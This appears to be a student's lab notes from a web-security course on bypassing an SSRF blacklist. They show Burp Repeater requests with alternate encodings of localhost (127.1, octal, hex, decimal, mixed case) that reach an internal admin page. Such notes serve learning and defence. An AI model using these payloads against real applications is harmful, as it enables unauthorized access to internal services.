# Section 18: SSRF - Bypassing Security

## Bypassing Blacklists

same stockApi ➡️ Send to the Repeater ➡️ modify URL

```
stockApi=http://localhost/
```

Error:

_External stock check blocked for security reasons_

A possible implementation to prevent unauthorized requests is with a **black list** (If request in blacklist then block it)

### Other ways to refer to localhost:

```
lOcaLHost
127.0.0.1
127.1
017700000001
0x7f000001
2130707433
```

```
stockApi=http://lOcaLHost/
```

```
stockApi=http://127.1/
```

Other options
- URL-encode all characters
- double encode it
- register a domain, which is not going to be in the blacklist, and have that resolved to 127.0.0.1

now the admin page is being displayed

---
